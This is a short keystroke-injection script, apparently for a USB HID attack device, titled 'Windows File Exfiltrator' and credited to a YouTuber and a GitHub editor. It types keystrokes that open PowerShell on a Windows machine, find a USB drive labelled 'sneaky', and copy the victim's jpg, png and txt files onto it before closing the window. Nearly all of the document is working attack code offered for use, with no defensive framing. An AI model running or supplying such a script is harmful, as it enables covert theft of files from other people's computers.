// Windows File Exfiltrator
// author: Saytonic https://youtu.be/I_BjCdJlCo4
// edited by: Coderdude112 on GitHub 

layout('us');			// Set keyboard layout to US
 
press("GUI r");			// Opens a run command
delay(500);
type("powershell\n"); 	// Opens powershell
delay(1000);

var filetypes = ["jpg", "png", "txt"] // The file extensions that will be exfiltrated

type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'sneaky' } | select name\n"); // Find the drive named "sneaky" and save it's path
for (var i = 0; i < filetypes.length; i++) {
    type("copy */*." + filetypes[i] + " $usbpath.name\n")} // Copys the files

type("exit\n");  		// Closes out 
